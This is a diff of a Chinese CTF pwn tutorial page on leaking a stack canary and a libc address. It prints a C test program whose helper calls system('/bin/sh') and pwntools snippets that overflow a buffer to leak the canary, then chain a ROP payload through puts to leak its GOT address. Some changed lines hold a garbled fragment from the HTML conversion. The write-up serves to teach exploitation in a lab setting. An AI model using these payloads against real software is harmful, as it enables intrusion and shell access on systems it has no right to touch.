@@ -214,8 +214,8 @@
 <p>Canary值 是在程序使用gcc编译时 开启Canary保护后生成的一个随机的值 通常会在每个函数开始时将其插入到栈中 目的是在函数返回前 检测函数的栈 (主要是返回地址) 有没有遭到攻击者篡改 通过以上描述 可以很清晰的知道 如果我们不知道Canary值的话 是不可能进行ROP操作的 在没有Canary值的情况下基本限制死了攻击者对栈上的攻击</p>
 </blockquote>
 <h3 id="泄漏Canary值"><a href="#泄漏Canary值" class="headerlink" title="泄漏Canary值"></a>泄漏Canary值</h3><p>先给出样例</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></stdlib.h></span></span>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></span></span>
 <span class="token keyword">void</span> <span class="token function">sys</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
       <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -343,7 +343,7 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
 <p>当然这是有libc库的情况 如果没有的话就需要先泄漏出来两个函数的真实地址 然后再相减做计算了 </p>
 </blockquote>
 <p>通常来说泄漏libc最主要的目的就是进行ROP 也就是获取libc基地址及各个函数的偏移 那么这里直接给出测试源码</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></stdio.h></span></span>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></span></span>
 
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
@@ -389,31 +389,31 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
 </blockquote>
 <p>有了以上条件 基本思路也就可以形成了<br>首先是需要去泄漏出来puts函数的真实地址 然后再利用给出的libc文件 计算出libc的基地址 最后通过栈溢出 拿到shell </p>
 <p>当然在有Canary保护的情况下首先还是应该泄漏Canary的值 </p>
-<pre class=" language-python"><code class="language-python">sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
-payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+<pre class=" language-python">sh.recvuntil("><code class="language-python">sh.recvuntil(">> ")
+sh.sendline("1")
+payload='a'*0x68
+sh.sendline(payload)
 
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token punctuation">)</span>
-canary<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x0a</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"canary:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+sh.recvuntil(">> ")
+sh.sendline("2")
+sh.recvuntil('a'*0x68)
+canary=u64(sh.recv(8))-0x0a
+log.info("canary:"+hex(canary))</code></pre>
 <p>这样 就可以利用栈溢出 覆盖掉Canary的\x00 然后成功泄漏出Canary值 </p>
 <p><a rel="如何泄漏PWN中的一些信息" href="https://ae01.alicdn.com/kf/H0a7101de549443aba47e08b1de23b8055.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H0a7101de549443aba47e08b1de23b8055.png" alt></a></p>
 <p>在有了Canary值后 就可以肆无忌惮的进行栈溢出 不用怕chk_stack_fail了… 那么下一步就是为了泄漏libc基地址做准备 回看一下程序源码 发现puts函数和read函数是执行过的 可以根据个人喜好自己泄漏相对于的真实地址 这里我选择的是puts地址 </p>
-<pre class=" language-python"><code class="language-python">sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
-payload2<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+<pre class=" language-python">sh.recvuntil("><code class="language-python">sh.recvuntil(">> ")
+sh.sendline("1")
+payload2='a'*0x68+p64(canary)+'a'*0x8+p64(pop_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
+sh.sendline(payload2)
 
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
+sh.recvuntil(">> ")
+sh.sendline('3')
 
 
 
-puts_got<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"puts_got:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+puts_got=u64(sh.recv(6).ljust(8,'\x00'))
+log.info("puts_got:"+hex(puts_got))</code></pre>
 <figure class="image-box">
                 <a rel="如何泄漏PWN中的一些信息" href="https://ae01.alicdn.com/kf/Hc2e83934915d427b915f9437089a01b0u.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/Hc2e83934915d427b915f9437089a01b0u.png" alt title class></a>
                 <p></p>
@@ -591,9 +591,9 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 <nav class="post-nav flex-row flex-justify-between">
   
     <div class="prev">
-      <a href="/2019/11/12/unctf-fu-xian-wp-pwn/" id="post-prev" class="post-nav-link">
+      <a href="/2019/11/16/rop-ji-zhu/" id="post-prev" class="post-nav-link">
         <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
-        <h4 class="title">UNCTF复现WP(PWN)</h4>
+        <h4 class="title">ROP技术</h4>
       </a>
     </div>
   
